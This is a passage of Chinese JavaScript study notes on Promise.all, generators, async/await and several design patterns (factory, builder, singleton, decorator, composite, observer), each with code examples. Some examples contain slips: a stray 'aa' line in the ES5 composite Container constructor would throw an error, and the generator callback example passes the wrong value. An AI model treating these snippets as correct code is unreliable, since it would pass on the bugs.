- 如果传入的参数是一个空的可迭代对象，则返回一个**已完成（already resolved）**状态的 [`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)。

- 如果传入的参数不包含任何 `promise`，则返回一个**异步完成（asynchronously resolved）** [`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)。注意：Google Chrome 58 在这种情况下返回一个**已完成（already resolved）**状态的 [`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)。

- 其它情况下返回一个**处理中（pending）**的[`Promise`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise)。这个返回的 `promise` 之后会在所有的 `promise` 都完成或有一个 `promise` 失败时**异步**地变为完成或失败。 见下方关于“Promise.all 的异步或同步”示例。

  `注意：返回值将会按照参数内的 promise 顺序排列，而不是由调用 promise 的完成顺序决定。`

[说明](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise/all#说明)

此方法在集合多个 `promise` 的返回结果时很有用。

完成（Fulfillment）：
如果传入的可迭代对象为空，`Promise.all` 会同步地返回一个已完成（resolved）状态的`promise`。
如果所有传入的 `promise` 都变为完成状态，或者传入的可迭代对象内没有 `promise`，`Promise.all` 返回的 `promise` 异步地变为完成。
在任何情况下，`Promise.all` 返回的 `promise` 的完成状态的结果都是一个数组，它包含所有的传入迭代参数对象的值（也包括非 `promise` 值）。

失败/拒绝（Rejection）：
如果传入的 `promise` 中有一个失败（rejected），`Promise.all` 异步地将失败的那个结果给失败状态的回调函数，而不管其它 `promise` 是否完成。

**但是上面仍然不够方便**

下面我们再来介绍下generator

##### generator

**1.相关概念**

**1）为什么要引入Generator？**
 众所周知，传统的JavaScript异步的实现是通过回调函数来实现的，但是这种方式有两个明显的缺陷：

- 缺乏可信任性。例如我们发起ajax请求的时候是把回调函数交给第三方进行处理，期待它能执行我们的回调函数，实现正确的功能
- 缺乏顺序性。众多回调函数嵌套使用，执行的顺序不符合我们大脑常规的思维逻辑，回调逻辑嵌套比较深的话调试代码时可能会难以定位。

Promise恢复了异步回调的可信任性，具体参见（欸欸这个往后放），而Generator正是以一种看似顺序、同步的方式实现了异步控制流程，增强了代码可读性。

**2）概念：**

- **Generator**(生成器)是一类特殊的函数，跟普通函数声明时的区别是加了一个*号，以下两种方式都可以得到一个生成器函数：

```
     // 声明方式一（个人比较偏向这种风格啦）
     function *main() {
         // do something……
     }

     // 声明方式二
     function* main() {
         // do something
     }
```

**Iterator**(迭代器)：当我们实例化一个生成器函数之后，这个实例就是一个迭代器。可以通过next()方法去启动生成器以及控制生成器的是否往下执行。

**yield/next**：这是控制代码执行顺序的一对好基友。
 通过yield语句可以在生成器函数内部暂停代码的执行使其挂起，此时生成器函数仍然是运行并且是活跃的，其内部资源都会保留下来，只不过是处在暂停状态。
 在迭代器上调用next()方法可以使代码从暂停的位置开始继续往下执行。

```
     // 首先声明一个生成器函数
     function *main() {
         console.log('starting *main()');
         yield; // 打住，不许往下走了
         console.log('continue yield 1');
         yield; // 打住，又不许往下走了
         console.log('continue yield 2');
     }
     // 构造处一个迭代器it
     let it = main(); 

     // 调用next()启动*main生成器，表示从当前位置开始运行，停在下一个yield处
     it.next(); // 输出 starting *main()

     // 继续往下走
     it.next(); // 输出 continue yield 1

     // 再继续往下走
     it.next(); // 输出 continue yield 2
```

以上是一个非常简单的yield/next相互配合控制代码执行的例子，认真看的同学可能会产生一个疑问：
 	**next()居然比yield多了一个？？？**
 	没错，就是这样的，因为let it = main(); 进行实例化之后，main()里的代码不会主动执行。第一个next()永远是用于启动生成器，生成器启动后要想运行到最后，其内部的每个yield都会对应一个next()，所以说next()永远都会比yield多一个了~~

**2.消息传递**

生成器的作用之一是消息传递。通过yield ...和next(...)组合使用，可以在生成器的执行过程中构成一个双向消息传递系统。

- 当next(..)执行到yield语句处时会暂停生成器的执行，同时next(...)会得到一个带有value属性的对象，yield语句后面带的值会赋给value(如果yield后面没有值，value就为undefined)。可以将yield ...效果看成跟return ...类似。
- 当生成器处于暂停状态时，暂停的yield表达式处可以接收下一个启动它的next(...)传进来的值。当next(...)使生成器继续往下执行时，其传入的值会将原来的yield语句替换掉。

看个栗子：

```
     function *main() {
         let x = yield "starting";
         let y = yield (x * 2);

         console.log(x, y);
         return x + y;
     }

     let it = main();

     let res = it.next(); // 第一个next()用于启动生成器
     console.log(res.value);  // 输出"starting" （yield语句后跟的值传给了next()的对象）

     res = it.next(5); // 向等待的第一个yield传入值5，*main()中的 x 被赋值为5
     console.log(res.value); // 输出10 （x * 2得到了10传给next(5)运行后的对象）

     res = it.next(20); // 向等待的第二个yield传入值20， *main()中的y被赋值为20
                        // 输出5 20    （执行后面的console.log(x, y)语句分别输出x,y的值）
     console.log(res.value); // 输出25  (return ...的值传给了next(20)运行后的对象)
```

**注意:**

1. 第一个next()仅仅是用于启动生成器用的，并不会传入任何东西，如果传入了参数也会被自动忽略掉。
2. yield ...在值传递方面的作用相当于return ...，你也可以把它当做一个return语句来看待，如果yield后面不加参数，则默认yield undefined;
3. 最后一个next()执行完毕之后，得到的值是*main()函数return出来的值，如果函数没有自己加return语句，一样也会默认return undefined;
4. next()执行完毕后会返回一个对象，属性值有两个，分别为value(从yield或return处拿到的值)和done(boolean值，标识生成器是否执行完毕)。

接下来尝试一下异常传值的情况：

```
     function *main() {
         let x = yield "starting";
         let y = yield (x * 2);
         console.log(x, y);
     }

     let it = main();

     let res = it.next('1111'); // '1111'被丢弃啦~~
     console.log(res.value);  // 输出"starting"

     res = it.next(); // 不给yield传值 x成了undefined
     console.log(res.value); // 输出NaN （undefined * 2得到了NaN传给next()运行后的对象）

     res = it.next(); // 不给yield传值 y未拿到值
                      // 输出undefined undefined
     console.log(res.value); // 输出undefined  (默认return undefined;)
```

3.Generator在流程控制中的应用##

基础概念说完了，那么，Generator是如何解决传统回调中存在的缺乏顺序性问题的呢？首先来看下面一个使用传统回调函数实现异步的例子：

```
     function getCallSettings() {
         // utils.ajax方法用于发起ajax请求
         utils.ajax({
             url: '/dialer/dialerSetting',
             method: "GET",
             success: (res) => {
                 let settingInfo = res.dialerSetting;
                 dealData(settingInfo);
             },
             error: (err) => {
                 console.log(err);
             }
         });
     }
     function dealData(data) {
         // do something……
     }
     getCallSettings();
```

可以看出，dealData只能在ajax请求拿到数据之后才能运行，所以需要嵌套在success回调中执行。以上例子嵌套的不深，依赖settingInfo的地方也不多，只有一个dealData函数，所以看起来还好，但是，试想一下如果接下来的很多其他请求都依赖于该请求返回的数据，或者很多代码逻辑都需要拿到settingInfo之后才能进行，那么代码可读性就会差很多了。
 所以，接下来尝试以生成器的方式实现以上场景：

```javascript
     function getCallSettings() {
         utils.ajax({
             url: '/dialer/dialerSetting',
             method: "GET",
             success: (res) => {
                 it.next(res.dialerSetting); // 将res.dialerSetting传给yield表达式
             },
             error: (err) => {
                 it.throw(err); // 抛出错误
             }
         });
     }
     function *dealData() {
         try{
            let settingInfo = yield getCallSettings();
            // do something……
         }
         catch(err) {
           console.log(err); // 接收错误
         }
     }
     let it = dealData();
     it.next(); // 启动生成器
```

此处的yield是用于在异步流程中暂停阻塞代码，当然，它阻塞的只有生成器里面的代码，生成器外部的丝毫不受影响。let settingInfo = yield getCallSettings();中，通过yield把异步的流程完全抽离出去，实现了看似顺序同步的代码，这无疑是巨大的改进。

使用generator**改造回调函数**

```
     //使用generator优化
     function fn1() {
       fs.readFile('./1.txt', 'utf-8', (err, result1) => {
         console.log(result1)
         it.next(result1)
       })
     }
     function fn2 (result1) {
       fs.readFile('./2.txt', 'utf-8', (err, result2) => {
         console.log(result1+result2)
         it.next(result1+result2)
       })
     }
     function fn3 (result1,result2) {
       fs.readFile('./3.txt', 'utf-8', (err, result3) => {
         console.log(result1+result2+result3);
         it.next(result1+result2)
       })
     }
     function *main() {
       let result1 = yield fn1()
       let result2 = yield fn2(result1)
       let result3 = yield fn3(result1,result2)
     }
     let it = main()
     it.next()
```

但是我们处理异步事件一般是把它封装在promise中的，处理promise例子如下

**4.Generator+Promise实现完美异步##**

1.如果将Generator和Promise结合在一起使用，既让代码看起来顺序同步，又恢复了可信任性，可以说是非常完美的了。

```
     function getCallSettings() {
         // utils.ajax方法支持返回promise对象，把得到的promise return出去
         return utils.ajax({
             url: '/dialer/dialerSetting',
             method: "GET",
         });
     }
     function *dealData() {
         try {
             let settingInfo = yield getCallSettings();
             // do something……
         }
         catch(err) {
             console.log(err); // 接收错误
         }
     }

     let it = dealData();
     let promise = it.next().value; // 注意，这里拿到yield出来的promise
     promise.then(
         (info) => {
             it.next(info); // 拿到info传给yield表达式
         }, 
         (err) => {
             it.throw(err); // 抛出错误
         }
     );
```

2.这种方式的另一个好处在于，当多个Promise并发请求时，正确的写法可以更好地提高性能。
			例如以下场景：

```
     // 满屏都是代码，这里代码尽量精简些啦
     function *dealData() {
         let r1 = yield utils.ajax(reqUrl1); // 请求1获取到 r1
         let r2 = yield utils.ajax(reqUrl2); // 请求2获取到 r2

         let reqUrl3 = getUrl(reqUrl1, reqUrl2); // 请求3需要的url依赖于前面两个请求
         let r3 = yield utils.ajax(reqUrl3);
         // do something……
     }
```

以上写法中，生成器执行时会先发出请求1，请求1返回后才会发出请求2，请求2返回之后，再发出请求3。其实在这里请求1和2之间不存在依赖关系，是可以同时进行的。所以还可以用一种效率更高的写法：

```
     // 满屏都是代码，这里代码也尽量精简些啦
     function *dealData() {
         let p1 = utils.ajax(reqUrl1); // 请求1获取到 r1
         let p2 = utils.ajax(reqUrl2); // 请求2获取到 r2

         let r1 = yield p1;
         let r2 = yield p2;

         let reqUrl3 = getUrl(reqUrl1, reqUrl2); // 请求3需要的url依赖于前面两个请求
         let r3 = yield utils.ajax(reqUrl3);
         // do something……
     }
```

这样p1和p2之间就可以同时进行，不会相互阻塞啦~~是不是很棒棒呢

**yield 委托**

为什么要用委托呢？因为，一个代码组织合理的程序中，出于功能模块化等原因，我们很可能在一个生成器中调用另外一个生成器，比如在a()中调用b()，但是通常情况下a()的实例中是无法使用next方法对b()内部进行操控的，所以这个时候我们就可以使用yield将b()委托给a()。

```
function *a() {
    console.log('a start');
    yield 2;
    console.log('a end');
}
function *b() {
    console.log('b start');
    yield 1;
    yield *a(); // 将a委托给b
    yield 3;
    console.log('b end');
}

let it = b();

it.next().value;    // b start
                    // 1 
it.next().value;    // a start
                    // 2
it.next().value;    // a end
                    // 3
it.next().value;    // b end
```

合理地进行生成器分离和使用委托，可以使代码可读性更强，更易维护~~~~~

##### async和await

> ES2017 标准引入了 async 函数，使得异步操作变得更加方便。
>
> async 函数是什么？一句话，它就是 Generator 函数的语法糖。

以上yield + Promise的写法需要我们对拿到的promise的决议进行人工处理(区分成功或失败)，在ES8中提供了async/await帮我们省掉了这个步骤：async/await组合的出现使得异步的世界更加完美啦~~
 下面改写一下代码实现形式：

```javascript
     function getCallSettings() {
         return utils.ajax({
             url: '/dialer/dialerSetting',
             method: "GET",
         });
     }
     async function dealData() {
         try {
             let settingInfo = await getCallSettings(); // await会暂停在这，直到promise决议(请求返回)
             // do something……
         }
         catch(err) {
             console.log(err);
         }
     }
     dealData();
```

dealData函数不需要再被声明为生成器函数，而是声明为async函数；
 同时，其内部也不用yield出一个promise，而是用await进行等待，直到promise决议。

async 修饰的函数会返回一个Promise决议，return 的参数就是resolve（）括号里面的，我们可以使用then或者await接收它

async修饰的函数，return相当于promise中的resolve（决议），所以我们可以使用await阻断return，这样就能执行控制流程了

```
     (async function () {
       async function fun () {
         console.log('fun');
         const p = await pro()
         console.log(p);
         return '23233'
       }
       function pro () {
         return new Promise(resolve => {
           setTimeout(() => {
             resolve('promise哦')
           }, 1000);
         })
       }
       const f = await fun()
       console.log(f);
       console.log('-----');
     })()

     async function helloAsync () {
       return "helloAsync";
     }
     console.log(helloAsync())
```

输出结果：

![image-20210726012725078](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210726012725.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210804005909.png" alt="image-20210804005908858" style="zoom:67%;" />

**那么async/await的写法和yield相比孰优孰劣呢？**
 其实个人感觉两者都有自己独到的长处，没有优劣之分(纯属个人见解，不喜勿喷)

- async/await在处理promise的层面上省略了对决议的人工处理，让代码量得以减少，语义上也更容易理解。
- yield包容性更广泛，async只能接口promise，yield除此之外还能接收字符串、数组、对象等各种类型的数据。

##### 基于generator实现async_await

```
// 使用async/await处理
// const async1 = () => new Promise(resolve => setTimeout(() => resolve(Date.now()), 1000))
// const async2 = () => new Promise(resolve => setTimeout(() => resolve(Date.now()), 1000))
// async function test () {
//   const data1 = await async1()
//   console.log('data1: ', data1);
//   const data2 = await async2()
//   console.log('data2: ', data2);
// }
// test()
//使用generator处理
const async1 = () => new Promise(resolve => setTimeout(() => resolve(Date.now()), 1000))
const async2 = () => new Promise(resolve => setTimeout(() => resolve(Date.now()), 1000))
//自动执行器，如果一个Generator函数没有执行完，则递归调用
function autoExecutor (generatorFn) {
  var it = generatorFn();
  function recursion (data) {
    var result = it.next(data);
    if (result.done) {
      return result.value;
    }
    result.value.then(data => {
      //当这个Promise执行resolve时,调用自身，相当于继续调用next(),让下面的代码执行
      recursion(data)
    });
  }
  recursion();
}
// 所需要执行的Generator函数，内部的数据在执行完成一步的promise之后，再调用下一步
function* main () {
  var f1 = yield async1();
  console.log(f1);
  var f2 = yield async2();
  console.log(f2);
};
```



## 设计模式

> Design Pattern

什么是设计模式？

> 假设有一个空房间，我们要日复一日地往里 面放一些东西。最简单的办法当然是把这些东西 直接扔进去，但是时间久了，就会发现很难从这 个房子里找到自己想要的东西，要调整某几样东西的位置也不容易。所以在房间里做一些柜子也许是个更好的选择，虽然柜子会增加我们的成 本，但它可以在维护阶段为我们带来好处。使用这些柜子存放东西的规则，或许就是一种模式

学习设计模式，有助于写出可复用和可维护性高的程序

设计模式的原则是“找出 程序中变化的地方，并将变化封装起来”，它的关键是意图，而不是结构。

不过要注意，使用不当的话，可能会事倍功半。

### 设计原则

**单一职责原则（SRP）**

一个对象或方法只做一件事情。如果一个方法承担了过多的职责，那么在需求的变迁过程中，需要改写这个方法的可能性就越大。

应该把对象或方法划分成较小的粒度

**最少知识原则（LKP）**

一个软件实体应当 尽可能少地与其他实体发生相互作用 

应当尽量减少对象之间的交互。如果两个对象之间不必彼此直接通信，那么这两个对象就不要发生直接的 相互联系，可以转交给第三方进行处理

**开放-封闭原则（OCP）**

软件实体（类、模块、函数）等应该是可以 扩展的，但是不可修改

当需要改变一个程序的功能或者给这个程序增加新功能的时候，可以使用增加代码的方式，尽量避免改动程序的源代码，防止影响原系统的稳定

### 工厂模式

> 工厂模式定义一个用于创建对象的接口，这个接口由子类决定实例化哪一个类。该模式使一个类的实例化延迟到了子类。而子类可以重写接口方法以便创建的时候指定自己的对象类型（抽象工厂）。
>
> 这个模式十分有用，尤其是创建对象的流程赋值的时候，比如依赖于很多设置文件等。并且，你会经常在程序里看到工厂方法，用于让子类定义需要创建的对象类型。
>
> 工厂模式根据抽象程度的不同可以分为：1.简单工厂 2.工厂方法 3.抽象工厂

#### 1.简单工厂

```
let  factory = function (role) {
function superman() {
    this.name ='超级管理员',
    this.role = ['修改密码', '发布消息', '查看主页']
}

function commonMan() {
    this.name = '普通游客',
    this.role = ['查看主页']
}

switch(role) {
    case 'superman':
    return new superman();
    break;
    case 'man':
    return new commonMan();
    break;
    default:
    throw new Error('参数错误')
}
}
let superman = factory('superman');
let man = factory('man');
```

在上述代码中,factory就是一个简单的工厂,该工厂中有二个构造函数分别对应不同的权限。我们只需要传递相应的参数就可以获取一个实例对象了。

简单工厂的优点: 你只需要传递一个合法的参数,就可以获取到你想要的对象,而无需知道创建的具体的细节。但是在函数内包含了所有对象的构造函数和判断逻辑的代码, 每次如果需要添加一个对象,那么我们需要新增一个构造函数,当我们需要维护的对象不是上面这2个,而是20个或者更多,那么这个函数将会成为超级函数,使得我们难以维护。所以简单工厂模式只适用于在创建时对象数量少,以及逻辑简单的情况。

#### 2.工厂方法

工厂方法模式本意是将实际创造的对象推迟到子类中,这样核心类就变成了抽象类。但是在js中很难像那些传统面向对象语言那样去实现抽象类,所以在js中我们只需要参考他的思想即可。

我们可以把工厂函数看成是一个工厂类。在简单模式我们,我们添加一个新的对象需要修改二处地方,在加入工厂方法模式以后,我们只需要修改一处即可。工厂方法的工厂类,他只做实例化这一件事情。我们只需要修改他的原型类即可。我们采用安全模式创建工厂对象。

```
    function Person(name) {
      this.name = name
    }
    Person.prototype.getName = function () {
      console.log(this.name);
    }
    function Car(model) {
      this.model = model
    }
    Car.prototype.getModel = function () {
      console.log(this.model);
    }
    function create(type, param) {
      if (this instanceof create) {
        return new this[type](param)
      } else {
        return new create(type, param)
      }
    }
    create.prototype = {
      person: Person,
      car: Car
    }
    var person1 = new create('person', 'zhang san')
    var car1 = create('car', 'Benz')
    console.log(person1);
    console.log(car1);
    person1.getName()
    car1.getModel()
```

在上述代码中要是忘记加new了, 那么我们就获取不到Person，Car等构造函数了,使用安全模式可以很好的解决这个问题。

**什么时候使用工厂模式**

工厂模式在应用于以下情况时尤其有用：

当我们创建的对象或组件涉及到了很高的复杂度。当我们需要根据所处的环境生成不同的对象实例时。当我们处理含有相同属性的对象或组件时。当创建的对象是其他对象的实例，而且要求它们有一致的API接口时。有利于解耦。

### 建造者模式

> 建造者模式可以将一个复杂的对象的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。也就是说如果我们用了建造者模式，那么用户就需要指定需要建造的类型就可以得到它们，而具体建造的过程和细节就不需要知道了。建造者模式实际就是一个指挥者，一个建造者，一个使用指挥者调用具体建造者工作得出结果的客户。
>
> 建造者模式主要用于“分步骤构建一个复杂的对象”，在这其中“分步骤”是一个稳定的算法，而复杂对象的各个部分则经常变化。

**建造者模式的作用和注意事项**

模式作用：

1.分步创建一个复杂的对象

2.解耦封装过程和具体创建组件

3.无需关心组件如何组装

注意事项：

1.一定要一个稳定的算法进行支持

2.加工工艺是暴露的

**普通代码**

```
	   // 应聘者信息
         var data = [
           {
             name: 'zhang san',
             age: 23,
             work: 'engineer'
           },
           {
             name: 'li si',
             age: 26,
             work: 'teacher'
           },
           {
             name: 'wang wu',
             age: 13,
             work: 'xxx'
           }
         ]
         //生成应聘者实例的类
         function Candidate(param) {
           var _candidate = {}
           _candidate.name = param.name
           _candidate.age = param.age
           _candidate.firstName = _candidate.name.split(' ')[0]
           _candidate.secondName = _candidate.name.split(' ')[1]
           _candidate.work = {}
         	function switchFun(work) {
             switch (work) {
               case 'engineer':
                 _candidate.work.name = '工程师';
                 _candidate.work.description = '热爱编程';
                 break;
               case 'teacher':
                 _candidate.work.name = '教师';
                 _candidate.work.description = '乐于分享';
                 break;
               default:
                 _candidate.work.name = work
                 _candidate.work.description = '无';
             }
           }
           switchFun(param.work)
           //更改工作的方法
           _candidate.work.changeWork = function (work) {
             this.name = work;
             switchFun(work)
           }
           //更改工作描述的方法
           _candidate.work.changeDes = function (des) {
             this.description = des
           }
           return _candidate
         }
         var candidateArr = []
         // 遍历生成应聘者实例
         for (var i = 0; i < data.length; i++) {
           candidateArr[i] = Candidate(data[i])
         }
         console.log(candidateArr[0]);
         // 更改工作名称
         candidateArr[0].work.changeWork('xxx');
         console.log(candidateArr[0]);
```

**使用建造者模式改造**

```
        // 应聘者信息
         var data = [
           {
             name: 'zhang san',
             age: 23,
             work: 'engineer'
           },
           {
             name: 'li si',
             age: 26,
             work: 'teacher'
           },
           {
             name: 'wang wu',
             age: 13,
             work: 'xxx'
           }
         ]
         //生成应聘者实例的类
         function Candidate(param) {
           var _candidate = new Person(param)
           _candidate.name = new CreateName(param.name)
           _candidate.work = new CreateWork(param.work)
           return _candidate
         }

         function Person(param) {
           this.age = param.age
         }

         function CreateName(name) {
           this.wholeName = name;
           this.firstName = name.split(' ')[0]
           this.secondName = name.split(' ')[1]
         }
         function CreateWork(work) {
           switch (work) {
             case 'engineer':
               this.name = '工程师';
               this.description = '热爱编程';
               break;
             case 'teacher':
               this.name = '教师';
               this.description = '乐于分享';
               break;
             default:
               this.name = work
               this.description = '无';
           }
           //更改工作的方法
           CreateWork.prototype.changeWork = function (work) {
             CreateWork.call(this, work)
           }
           //更改工作描述的方法
           CreateWork.prototype.changeDes = function (des) {
             this.description = des
           }
         }
         var candidateArr = []
         // 遍历生成应聘者实例
         for (var i = 0; i < data.length; i++) {
           candidateArr[i] = Candidate(data[i])
         }
         console.log(candidateArr[0]);
         // 更改工作名称
         candidateArr[0].work.changeWork('xxx');
         console.log(candidateArr[0]);
```

对比可以发现，普通代码把所有实现逻辑都放在一个类中，让这个类看起来非常臃肿阅读性差，而建造者模式会分步骤，一步步简化每个类里面的代码量，从而提高阅读性

### 单例模式

> 单例就是保证一个类只有一个实例，实现方法一般是先判断实例存在与否，如果存在直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。在JavaScript里，单例作为一个命名空间提供者，从全局命名空间里提供一个唯一的访问点来访问该对象。

问题：

```
    function NotSingle() {
      this.a = 123
    }
    var a1 = new NotSingle()
    var a2 = new NotSingle()
    console.log(a1 === a2);   //false
```

同一个类创造的实例不相等，如果就想他们想相等呢？

可以采用单例模式来进行改造

```
   var _unique = null;
    function createSingle() {
      var obj = {
        a: 1
      }
      if (_unique === null) {
        _unique = obj
      }
      return _unique
    }
    var a = createSingle()
    var b = createSingle()
    console.log(a === b);  //true
```

上面这种方法虽然可以实现单例模式，但是由于实例对象定义在全局中，不安全，下面使用闭包来进行改造

```
 //使用闭包进行改造
    var createSingle = (function () {
      var _unique = null
      function single() {
        return {
          a: 1
        }
      }
      return function () {
        if (_unique === null) {
          _unique = single()
        }
        return _unique
      }
    })()
    var a = createSingle()
    var b = createSingle()
    console.log(a === b);  //true
```

### 装饰者模式

> 装饰者模式，希望在不改变原对象的基础上，通过对其拓展功能和属性来实现更复杂的逻辑。

有一个案例：4s店在卖一种车，价格为10万元，如果用户需要在此基础上加装一些配置则需要加钱。比如加热座椅配置需要2万元，电动后视镜需要0.8万元等等

**普通写法：**

```
  function Car() {
      this.price = 10
    }
    Car.prototype = {
      addHeatSeat: function () {
        this.hasHeatSeat = true
        this.price += 2
      },
      addAutoMirror: function () {
        this.hasAutoMirror = true
        this.price += 0.8
      }
    }
    var car1 = new Car()
    console.log(car1.price);  //10
    car1.addHeatSeat()
    car1.addAutoMirror()
    console.log(car1.price);  //12.8
```

**装饰者模式：**

```
	function Car() {
      this.price = 10
    }

    function carWithHeatSeat(carExample) {
      carExample.hasHeatSeat = true
      carExample.price += 2
    }
    function carWithHeatMirror(carExample) {
      carExample.hasAutoMirror = true
      carExample.price += 0.8
    }

    var car2 = new Car();
    console.log(car2.price); //10
    carWithHeatSeat(car2)
    carWithHeatMirror(car2)
    console.log(car2.price); //12.8
```

两种模式对比，装饰者模式是独立与构造函数之外的函数，这样就能减少对构造函数的介入

### 组合模式

> 组合模式作用于将多个部分通过组合变成一个整体。

比如我们在工作中经常会制作一些表单，比如登录，注册，或者一些信息填写等等，这些表单其实都是类似的，如果你今天制作一个注册的表单，明天做个调查问卷的表单，是不是会觉得很妈蛋，有点重复劳动的感觉？

组合模式可以解决这个问题

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    //寄生式组合继承
    function inheritPrototype(subClass, superClass) {
      function F() { }
      F.prototype = superClass.prototype;
      subClass.prototype = new F()
      subClass.prototype.constructor = subClass
    }
    //组合继承
    // function inheritPrototype(subClass, superClass) {
    //   subClass.prototype = new superClass()
    // }
    //基类
    function Container() {
      aa
      this.children = []
      this.element = null
    }
    Container.prototype = {
      init: function () {
        throw new Error('请重写init方法')
      },
      add: function (child) {
        this.children.push(child)
        this.element.appendChild(child.element)
        return this
      }
    }
    //基于容器基类创建表单容器
    function CreateForm(id, method, action, parent) {
      Container.call(this)
      this.id = id || 'get';
      this.method = method || 'get'
      this.action = action || ''
      this.parent = parent
      this.init()
    }
    inheritPrototype(CreateForm, Container)
    CreateForm.prototype.init = function () {
      this.element = document.createElement('form')
      this.element.id = this.id
      this.element.method = this.method
      this.element.action = this.action
    }
    CreateForm.prototype.show = function () {
      this.parent.appendChild(this.element)
    }
    //行容器组件
    function CreateLine(className) {
      Container.call(this)
      this.className = className === undefined ? 'form-line' : 'form-line' + className
      this.init()
    }
    inheritPrototype(CreateLine, Container)
    CreateLine.prototype.init = function () {
      this.element = document.createElement('div')
      this.element.className = this.className
    }
    //label
    function CreateLabel(text, forName) {
      this.text = text || ''
      this.forName = forName || ''
      this.init()
    }
    CreateLabel.prototype.init = function () {
      this.element = document.createElement('label')
      this.element.setAttribute('for', this.forName)
      this.element.innerHTML = this.text
    }
    //input
    function CreateInput(type, id, name, defaultValue) {
      this.type = type || ''
      this.id = id || ''
      this.name = name || ''
      this.defaultValue = defaultValue || ''
      this.init()
    }
    CreateInput.prototype.init = function () {
      this.element = document.createElement('input')
      this.element.type = this.type
      this.element.id = this.id
      this.element.name = this.name
      this.element.value = this.defaultValue
    }
    
    var form = new CreateForm('owner-form', 'GET', 'https://www.baidu.com/s', document.body)
    console.log(new CreateLine());
    var userLine = new CreateLine()
      .add(new CreateLabel('用户名', 'user'))
      .add(new CreateInput('text', 'user', 'wd'))

    var pwdLine = new CreateLine()
      .add(new CreateLabel('密码', 'pwd'))
      .add(new CreateInput('password', 'pwd', 'pwd'))

    var submitLine = new CreateLine()
      .add(new CreateInput('submit', '', '', '登录'))
    form.add(userLine).add(pwdLine).add(submitLine).show()
  </script>
</body>
</html>
```

使用ES6 class来改造

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    //基类
    class Container {
      constructor() {
        this.children = [],
          this.element = null
      }
      init() {
        throw new Error('请重写init方法')
      }
      add(child) {
        this.children.push(child)
        this.element.appendChild(child.element)
        return this
      }
    }
    //基于容器基类创建表单容器
    class CreateForm extends Container {
      constructor(id, method, action, parent) {
        super()
        this.id = id || 'get';
        this.method = method || 'get'
        this.action = action || ''
        this.parent = parent
        this.init()
      }
      init() {
        this.element = document.createElement('form')
        this.element.id = this.id
        this.element.method = this.method
        this.element.action = this.action
      }
      show() {
        this.parent.appendChild(this.element)
      }
    }
    //行容器组件
    class CreateLine extends Container {
      constructor(className) {
        super()
        this.className = className === undefined ? 'form-line' : 'form-line' + className
        this.init()
      }
      init() {
        this.element = document.createElement('div')
        this.element.className = this.className
      }
    }
    //label类
    class CreateLabel {
      constructor(text, forName) {
        this.text = text || ''
        this.forName = forName || ''
        this.init()
      }
      init() {
        this.element = document.createElement('label')
        this.element.setAttribute('for', this.forName)
        this.element.innerHTML = this.text
      }
    }
    //input类
    class CreateInput {
      constructor(type, id, name, defaultValue) {
        this.type = type || ''
        this.id = id || ''
        this.name = name || ''
        this.defaultValue = defaultValue || ''
        this.init()
      }
      init() {
        this.element = document.createElement('input')
        this.element.type = this.type
        this.element.id = this.id
        this.element.name = this.name
        this.element.value = this.defaultValue
      }
    }

    var form = new CreateForm('owner-form', 'GET', 'https://www.baidu.com/s', document.body)
    console.log(new CreateLine());
    var userLine = new CreateLine()
      .add(new CreateLabel('用户名', 'user'))
      .add(new CreateInput('text', 'user', 'wd'))

    var pwdLine = new CreateLine()
      .add(new CreateLabel('密码', 'pwd'))
      .add(new CreateInput('password', 'pwd', 'pwd'))
    var submitLine = new CreateLine()
      .add(new CreateInput('submit', '', '', '登录'))
    form.add(userLine).add(pwdLine).add(submitLine).show()
  </script>
</body>
</html>
```

### 观察者模式

> 观察者模式又叫发布订阅模式或者消息模式。
>
> 是设计模式中非常著名也是非常重要的一种模式，这种模式一般会定义一个主体和众多的个体，这里主体可以想象为一个消息中心，里面有各种
>
> 各样的消息，众多的个体可以订阅不同的消息，当未来消息中心发布某条消息的时候，订阅过他的个体就会得到通知

核心：

​	取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。

​	与传统的发布-订阅模式实现方式（将订阅者自身当成引用传入发布者）不同，在JS中通常使用注册回调函数的形式来订阅

实现：

```
    //订阅发布中心
    var msgCenter = (function () {
      var _msg = {};  //储存消息
      // var _msg = {
      //   'carInfo' : [fn1,fn2...],
      //   'newsInfo': [fn1,fn2...],
      //    ......
      // }
      return {
        //用于订阅一个消息
        subscribe: function (type, fn) {
          if (_msg[type]) {
            _msg[type].push(fn)
          } else {
            _msg[type] = [fn]
          }
        },
        //用于发布消息
        release: function (type, args) {
          if (!_msg[type]) {
            return
          }
          var event = {
            type: type,
            args: args || {}
          }
          for (let index = 0; index < _msg[type].length; index++) {
            _msg[type][index](event)
          }
        },
        //用于取消订阅消息
        cancel: function (type, fn) {
          if (!_msg[type]) {
            return
          }
          for (let index = 0; index < _msg[type].length; index++) {
            if (_msg[type][index] === fn) {
              _msg[type].splice(index, 1)
              break
            }
          }
        }
      }
    })()
    //订阅者类
    function Person() {
      this.alreadysubscribe = {}
      Person.prototype.subscribe = function (type, fn) {
        //防止重复订阅
        if (this.alreadysubscribe[type]) {
          console.log('你已经订阅过这个消息了，请不要重复订阅！');
        } else {
          msgCenter.subscribe(type, fn)
          //这句话是为了保存每个实例的订阅回调方法，通过对比，可以防止重复订阅
          this.alreadysubscribe[type] = fn
        }
      }
      Person.prototype.cancel = function (type) {
        msgCenter.cancel(type, this.alreadysubscribe[type])
        delete this.alreadysubscribe[type]
      }
    }
    var person1 = new Person()
    var person2 = new Person()
    var person3 = new Person()
    //订阅
    person1.subscribe('carInfo', function (e) {
